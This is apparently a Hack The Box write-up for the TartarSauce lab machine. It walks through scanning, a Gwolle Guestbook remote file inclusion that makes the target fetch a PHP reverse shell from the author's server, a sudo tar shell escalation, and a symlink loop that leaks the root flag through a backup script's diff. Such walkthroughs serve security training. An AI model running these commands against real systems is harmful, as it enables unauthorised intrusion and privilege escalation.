---
title: Hack The Box - TartarSauce (Without Metasploit)
date: 2021-01-20 19:43:00 +0800
categories: [hackthebox]
tags: [linux, wordpress, tar, diff]
---

![](/assets/images/tartarsauce.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.88 tartarsauce.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ rustscan --accessible -a tartarsauce.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.88:80
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-19 16:26 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
Initiating Connect Scan at 16:26
Scanning tartarsauce.htb (10.10.10.88) [1 port]
Discovered open port 80/tcp on 10.10.10.88
Completed Connect Scan at 16:26, 0.00s elapsed (1 total ports)
Initiating Service scan at 16:26
Scanning 1 service on tartarsauce.htb (10.10.10.88)
Completed Service scan at 16:26, 6.03s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.88.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.21s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
Nmap scan report for tartarsauce.htb (10.10.10.88)
Host is up, received user-set (0.0049s latency).
Scanned at 2021-01-19 16:26:23 UTC for 6s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
```

# Enumeration (1)

## Port 80 Apache httpd 2.4.18 ((Ubuntu))

![](/assets/images/tartarsauce1.png)

We see a ASCII art of a tartar sauce bottle. Nothing much here. However, on `robots.txt`,

![](/assets/images/tartarsauce2.png)

we see a few pages we might be able to access. Only of these links, only `/webservices/monstra-3.0.4` had existed on the web server.

![](/assets/images/tartarsauce3.png)

None of the buttons worked though, so I did some directory bruteforcing.

```
─$ gobuster dir -k -u http://tartarsauce.htb/webservices/monstra-3.0.4  -w /usr/share/wordlists/dirb/big.txt -t 100 -x .html,.php,.txt,.xml
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://tartarsauce.htb/webservices/monstra-3.0.4
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,xml,html
[+] Timeout:        10s
===============================================================
2021/01/20 04:29:58 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.xml (Status: 403)
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.xml (Status: 403)
/admin (Status: 301)
/backups (Status: 301)
/boot (Status: 301)
/engine (Status: 301)
/favicon.ico (Status: 200)
/index.php (Status: 200)
/libraries (Status: 301)
/plugins (Status: 301)
/public (Status: 301)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/sitemap.xml (Status: 200)
/sitemap.xml (Status: 200)
/rss.php (Status: 200)
/storage (Status: 301)
/tmp (Status: 301)
===============================================================
2021/01/20 04:30:35 Finished
===============================================================
```

`/admin` seems interesting and turns out it was a login page!

![](/assets/images/tartarsauce4.png)

There wasn't much I could do with these pages. Lets go back to the `/webservices` and perform directory bruteforcing!

```bash
$ gobuster dir -k -u http://tartarsauce.htb/webservices/  -w /usr/share/wordlists/dirb/big.txt -t 100 -x .html,.php,.txt,.xml
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://tartarsauce.htb/webservices/
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,xml,html
[+] Timeout:        10s
===============================================================
2021/01/20 04:29:58 Starting gobuster
===============================================================
/wp (Status: 301)
===============================================================
2021/01/20 04:30:35 Finished
===============================================================
```

There is `/wp`! Upon visiting it, it seemed like everything was broken.

![](/assets/images/tartarsauce5.png)

Turns out all the URLs was missing a `/`.

![](/assets/images/tartarsauce6.png)

We can use `burp` and perform some modification in our response.

![](/assets/images/tartarsauce7.png)

After refreshing, we see that the website is no longer broken!

![](/assets/images/tartarsauce8.png)

It seems that this website is running `wordpress`. Let's use `wpscan`.

```bash
$ wpscan --url http://10.10.10.88/webservices/wp -e ap --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.12
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]
[+] Started: Tue Jan 19 21:56:45 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:03:11 <=======================================================================================================================================================> (91370 / 91370) 100.00% Time: 00:03:11
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2021-01-06T16:57:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.8
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] brute-force-login-protection
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
 | Latest Version: 1.5.3 (up to date)
 | Last Updated: 2017-06-29T10:39:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt

[+] gwolle-gb
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2021-01-15T13:43:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.0.8
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jan 19 22:00:05 2021
[+] Requests Done: 91378
[+] Cached Requests: 38
[+] Data Sent: 26.601 MB
[+] Data Received: 12.222 MB
[+] Memory used: 423.945 MB
[+] Elapsed time: 00:03:19
```

We see that there are 3 plugins installed. After verifying each plugin with `searchsploit`, we see that `gwolle-gb` had one exploit.

```bash
$ searchsploit gwolle
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion      | php/webapps/38861.txt
--------------------------------------------------------------------- ---------------------------------
```

The versions were different. However, I couldn't find anything about `gwolle-db` version `2.3.10`, so I went to check the changelog and saw something funny.

![](/assets/images/tartarsauce9.png)

The version installed was actually `1.5.3`! This means the exploit will work! 

# Exploitation (1)

According to the exploit, we need to setup a web server hosting a `wp-load.php` file. I will be using [file](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

```bash
$ ls web
php-reverse-shell.php
$ mv web/php-reverse-shell.php web/wp-load.php
$ sudo updog -p 80   
[+] Serving /home/kali/Desktop/web...
 * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
```

Then, using our browser, we will browse to `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.XX.XX/`. On our `nc` listener that we setup beforehand, we get a shell as `www-data`!

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.88] 36646
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
 22:38:41 up 46 min,  0 users,  load average: 0.07, 0.05, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

# Enumeration (2)

Checking `www-data`'s `sudo` rights, we see that he can run `tar` as `onuma`.

```bash
sudo -l 
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

# Exploitation (2)

According to GTFOBins, we can use `tar` to spawn a shell as `onuma`.

```bash
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
```

# user.txt

The user flag is in `onuma`'s home directory.

```bash
cat user.txt
b2d6XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (3)

In `/var/backup`, there were some files that apparently stood out.

```bash
ls -al /var/backups
...
-rw-r--r--  1 onuma onuma  11511681 Jan 19 22:42 onuma-www-dev.bak
-rw-r--r--  1 root  root      15693 Mar  9  2018 onuma_backup_error.txt
-rw-r--r--  1 root  root        219 Jan 19 22:42 onuma_backup_test.txt
...
```

I noticed that `onuma_backup_test.txt` was being updated every 5 minutes.

```bash
ls -al /var/backups
...
-rw-r--r--  1 onuma onuma  11511681 Jan 19 22:47 onuma-www-dev.bak
-rw-r--r--  1 root  root      15693 Mar  9  2018 onuma_backup_error.txt
-rw-r--r--  1 root  root        219 Jan 19 22:47 onuma_backup_test.txt
...
```

I uploaded `pspy` to the machine in order to monitor for running processes, in hopes to capture the process that is causing the `onuma_backup_test.txt` to be updated.

```bash
./pspy32
...
2021/01/19 22:57:37 CMD: UID=0    PID=3255   | /bin/bash /usr/sbin/backuperer 
2021/01/19 22:57:37 CMD: UID=0    PID=3260   | /usr/bin/printf - 
2021/01/19 22:57:37 CMD: UID=0    PID=3264   | 
2021/01/19 22:57:37 CMD: UID=0    PID=3266   | /bin/rm -rf /var/tmp/. /var/tmp/.. /var/tmp/check 
2021/01/19 22:57:37 CMD: UID=0    PID=3270   | /bin/sleep 30 
2021/01/19 22:57:37 CMD: UID=0    PID=3269   | /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.62b0f04e3f6418085dff6900a41c637028f4fc26 /var/www/html                                                                                                  
...
```

We see that a program called `/usr/sbin/backuperer` was being executed by `root`!

```bash
cat backuperer
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

The first part we should focus at is the `integrity_chk` function. 

```bash
# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}
```

After substiuting in the variables, the sole command it runs is `/usr/bin/diff -r /var/www/html /var/tmp/check/var/www/html`. It basically checks the difference in content between these 2 directories.

Further down, 

```bash
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
```

If the `integrity_chk` reports a single difference, it will be logged to `/var/backups/onuma_backup_error.txt`. 

# Exploitation (3)

To read the `root` flag, we can create symbolic link in `/var/tmp/check/var/www/html` that is linked to `/root/root.txt`. When the `backuperer` is executed, the difference caused by the creation caused by the new symbolic link will result inthe contents of the root flag to be saved to `/var/backups/onuma_backup_error.txt`. However, the `/var/tmp/check` folder will be deleted during every execution so we will need to constantly create our files and folders.

```python
import os 

while True:
    os.system("mkdir -p /var/tmp/check/var/www/html ; ln -s /root/root.txt /var/tmp/check/var/www/html/robots.txt 2> /dev/null")
```

We then run this script in the background.

```bash
python spam.py &
```

# root.txt

Subsequently, when `backuperer` is executed again, the contents of the root flag is saved to `/var/backups/onuma_backup_error.txt`!

```bash
cat /var/backups/onuma_backup_error.txt
...
------------------------------------------------------------------------
/var/tmp/.c33645ed5eb387ca0d962fafac5681ef29866777
diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
1,7c1
< User-agent: *
< Disallow: /webservices/tar/tar/source/
< Disallow: /webservices/monstra-3.0.4/
< Disallow: /webservices/easy-file-uploader/
< Disallow: /webservices/developmental/
< Disallow: /webservices/phpmyadmin/
< 
---
> e79aXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !